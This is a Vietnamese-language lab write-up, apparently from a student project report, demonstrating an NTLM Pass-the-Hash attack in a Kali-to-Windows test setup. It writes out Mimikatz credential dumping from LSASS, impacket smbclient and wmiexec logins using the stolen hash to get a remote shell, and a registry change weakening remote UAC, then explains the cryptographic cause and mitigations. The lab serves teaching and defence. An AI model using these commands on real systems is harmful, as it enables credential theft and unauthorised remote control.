# Hướng dẫn chi tiết Tấn công Pass-the-Hash (PtH) NTLM trên Windows (Mục 5.4)

Tài liệu này ghi lại chi tiết các bước thiết lập và thực hiện tấn công Pass-the-Hash (PtH) trên mô hình máy ảo **Kali Linux (Attacker)** và **Windows 10 (Victim)** như trong Báo cáo Bài tập lớn.

---

## 1. Chuẩn bị môi trường

Bạn có thể chọn 1 trong 2 mô hình sau:

### 🌟 Mô hình A: Kali Linux (WSL2) $\leftrightarrow$ Máy Windows Thật (Khuyên dùng - Cực nhẹ & Nhanh)
- **Máy tấn công (Kali Linux WSL2)**: Đã cài sẵn trên máy (chạy file `run_kali_pth_demo.bat` hoặc lệnh `wsl -d kali-linux -u root`). Đã có sẵn toàn bộ bộ công cụ `impacket-scripts`.
- **Máy nạn nhân (Windows Host)**: Chính là máy Windows của bạn. Chỉ cần mở PowerShell (Admin) tạo user `victim`.

### 🖥️ Mô hình B: 2 Máy ảo VMware độc lập (Như trong Báo cáo BTL)
- **Máy tấn công (Kali Linux VM)**:
  - Địa chỉ IP ví dụ: `192.168.107.141`
  - Cài sẵn bộ công cụ Impacket (`impacket-wmiexec`, `impacket-psexec`, `impacket-smbclient`).
  - Kiểm tra IP:
    ```bash
    ifconfig
    ```

- **Máy nạn nhân (Windows 10 x64 VM)**:
  - Địa chỉ IP ví dụ: `192.168.107.138`
  - Đã bật chia sẻ file SMB / dịch vụ WMI hoặc Remote Registry.
  - Tắt tạm thời Windows Defender (hoặc thêm whitelist Mimikatz) để phục vụ bài lab.
  - Kiểm tra IP & hostname:
    ```cmd
    ipconfig
    hostname
    whoami
    ```

---

## 2. Các bước thực hiện chi tiết

### Bước 1: Tạo User mục tiêu trên máy Windows Victim (Hình 39)
Mở `cmd.exe` với quyền **Administrator** trên Windows:
```cmd
net user victim 12345678 /add
net localgroup administrators victim /add
net share
```
*(Lệnh trên tạo tài khoản `victim` với mật khẩu `12345678`, gán quyền Quản trị viên và kiểm tra các share mặc định như `C$`, `ADMIN$`)*.

### Bước 2: Dump NTLM Hash bằng Mimikatz (Hình 40)
Chạy `mimikatz.exe` với quyền Administrator trên máy Windows nạn nhân (giả lập hacker đã chiếm quyền admin qua phishing):
```text
privilege::debug
sekurlsa::logonpasswords
```
Kết quả trích xuất từ tiến trình LSASS:
```text
Username : victim
Domain   : TRAN NGOCTHIENB2
NTLM     : 259745cb123a52aa2e693aaacca2db52
SHA1     : 4287f8bf42693da2f9f464ba537c5f101e275607
```
*(Lưu ý: NTLM hash `259745cb123a52aa2e693aaacca2db52` chính là $MD4(UTF\text{-}16LE("12345678"))$)*.

### Bước 3: Thực hiện tấn công Pass-the-Hash từ Kali Linux (Hình 41)

#### 🔹 Cách 1: Truy cập và duyệt toàn bộ ổ đĩa đặc quyền bằng `impacket-smbclient`
Dùng trực tiếp NTLM Hash `259745cb123a52aa2e693aaacca2db52` để đăng nhập vào dịch vụ chia sẻ file quản trị:
```bash
impacket-smbclient -hashes :259745cb123a52aa2e693aaacca2db52 victim@<IP_VICTIM>
```
Khi kết nối thành công vào shell tương tác `#`:
```text
# shares        (Xem danh sách ổ đĩa ADMIN$, C$, D$)
# use C$        (Chọn ổ C)
# ls            (Duyệt file và thư mục mà không cần mật khẩu)
# exit
```

#### 🔹 Cách 2: Chiếm quyền thực thi dòng lệnh bằng `impacket-wmiexec`
Hacker dùng trực tiếp hash để chiếm quyền điều khiển shell từ xa thông qua WMI:
```bash
impacket-wmiexec -hashes :259745cb123a52aa2e693aaacca2db52 victim@192.168.107.138
```
*(Nếu hệ thống bật Remote UAC, chạy lệnh PowerShell Administrator: `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`)*.

Kết quả:
```text
[*] SMBv3.0 dialect used
[*] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
TranNgocThienB23DCAT286
C:\>whoami
tranngocthienb2\victim
```
$\rightarrow$ **Truy cập máy nạn nhân thành công mà không cần mật khẩu!**

---

## 3. Bản chất lý thuyết Mật mã học vì sao PtH thành công

1. **Thuật toán NTLM không sử dụng Salt động trong việc lưu trữ**:
   - $NTLM\_Hash = MD4(UTF\text{-}16LE(Password))$
   - Cùng một mật khẩu luôn tạo ra cùng một giá trị hash tĩnh.
2. **Giao thức Challenge-Response của NTLM**:
   - Khi Server gửi Challenge $C$, Client tính $Response = f(C, NTLM\_Hash)$.
   - Giao thức **không bao giờ yêu cầu Client phải gửi hoặc biết mật khẩu Plaintext**, mà chỉ yêu cầu $NTLM\_Hash$ để làm khóa bí mật tạo Response.
   - Do đó, trong mắt giao thức NTLM: **"Ai sở hữu NTLM Hash = Người đó sở hữu tài khoản"**.

---

## 4. Giải pháp Phòng chống & Khắc phục
1. **Chuyển đổi giao thức**: Vô hiệu hóa NTLM trong Group Policy, chuyển hoàn toàn sang **Kerberos**.
2. **Bảo vệ LSASS**: Bật **Credential Guard** (Windows 11 / Server 2019+), bật tính năng **RunAsPPL** (Protected Process Light) cho `lsass.exe` để chặn Mimikatz đọc RAM.
3. **Quản lý mật khẩu đặc quyền**: Triển khai giải pháp **LAPS (Local Administrator Password Solution)** để mỗi máy trạm có mật khẩu Admin cục bộ riêng biệt, ngăn chặn Hacker di chuyển ngang (Lateral Movement) qua mạng.
